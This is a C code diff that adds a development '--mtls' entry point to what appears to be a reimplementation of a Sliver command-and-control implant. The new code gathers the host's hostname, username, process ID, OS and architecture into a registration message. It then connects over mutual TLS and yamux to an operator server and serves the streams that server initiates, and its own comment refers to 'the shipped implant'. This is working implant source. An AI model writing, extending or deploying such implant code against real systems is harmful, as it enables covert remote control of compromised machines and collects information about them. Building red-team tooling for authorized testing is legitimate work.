@@ -13,6 +13,7 @@
 #include "sliver/log.h"
 #include "sliver/platform.h"
 #include "sliver/proto.h"
+#include "sliver/session.h"
 #include "sliver/transport.h"
 #include "sliver/yamux.h"
 
@@ -345,6 +346,70 @@ out_sock:
   return rc;
 }
 
+/* --mtls <host> <port> <ca.pem> <cert.pem> <key.pem> <age-priv> <server.pub> [name]
+ *
+ * Development entry point for the real session: TLS 1.3 -> MUX/1 -> yamux ->
+ * signed Register, then serves server initiated streams until the connection
+ * dies. In the shipped implant every parameter comes from config.json instead. */
+static int run_mtls_session(int argc, char **argv) {
+  sliver_session_config_t cfg;
+  sliver_register_t reg;
+  char hostname[128];
+  char username[128];
+  const char *name;
+
+  if (argc < 9) {
+    (void)fprintf(stderr,
+                  "usage: %s --mtls <host> <port> <ca.pem> <cert.pem> <key.pem> "
+                  "<age-priv> <server.pub> [name]\n",
+                  argv[0]);
+    return 2;
+  }
+  memset(&cfg, 0, sizeof(cfg));
+  memset(&reg, 0, sizeof(reg));
+
+  cfg.host = argv[2];
+  cfg.port = (uint16_t)strtoul(argv[3], NULL, 10);
+  cfg.ca_pem = read_file(argv[4]);
+  cfg.cert_pem = read_file(argv[5]);
+  cfg.key_pem = read_file(argv[6]);
+  cfg.age_private_key = argv[7];
+  cfg.server_minisign_pubkey = read_file(argv[8]);
+  if (cfg.ca_pem == NULL || cfg.cert_pem == NULL || cfg.key_pem == NULL ||
+      cfg.server_minisign_pubkey == NULL) {
+    (void)fprintf(stderr, "cannot read one of the PEM/pubkey files\n");
+    return 2;
+  }
+
+  name = argc > 9 ? argv[9] : sliver_config_name();
+  (void)snprintf(reg.name, sizeof(reg.name), "%s", name);
+  if (sliver_hostname(hostname, sizeof(hostname)) == 0) {
+    (void)snprintf(reg.hostname, sizeof(reg.hostname), "%s", hostname);
+  }
+  if (sliver_username(username, sizeof(username)) == 0) {
+    (void)snprintf(reg.username, sizeof(reg.username), "%s", username);
+  }
+  (void)snprintf(reg.uuid, sizeof(reg.uuid), "%s", sliver_config_build_id());
+  (void)snprintf(reg.os, sizeof(reg.os), "%s",
+#if defined(_WIN32)
+                 "windows"
+#else
+                 "linux"
+#endif
+  );
+  (void)snprintf(reg.arch, sizeof(reg.arch), "%s", sizeof(void *) == 8 ? "amd64" : "386");
+  reg.pid = (int32_t)sliver_current_pid();
+  (void)snprintf(reg.filename, sizeof(reg.filename), "%s", argv[0]);
+  (void)snprintf(reg.version, sizeof(reg.version), "%s", "1.7.8");
+  reg.reconnect_interval = sliver_config_reconnect_interval_ns();
+  (void)snprintf(reg.config_id, sizeof(reg.config_id), "%s", sliver_config_build_id());
+  (void)snprintf(reg.locale, sizeof(reg.locale), "%s", "en-US");
+  cfg.reg = reg;
+
+  LOG_INFO("connecting to %s:%u", cfg.host, (unsigned)cfg.port);
+  return sliver_session_run(&cfg) == 0 ? 0 : 1;
+}
+
 int sliver_cli_main(int argc, char **argv) {
   char err[128];
 
@@ -375,6 +440,11 @@ int sliver_cli_main(int argc, char **argv) {
   }
   if (argc > 1 && strcmp(argv[1], "--yamux-selftest") == 0) {
     int rc = run_yamux_selftest(argc, argv);
+    sliver_plat_cleanup();
+    return rc;
+  }
+  if (argc > 1 && strcmp(argv[1], "--mtls") == 0) {
+    int rc = run_mtls_session(argc, argv);
     sliver_plat_cleanup();
     return rc;
   }
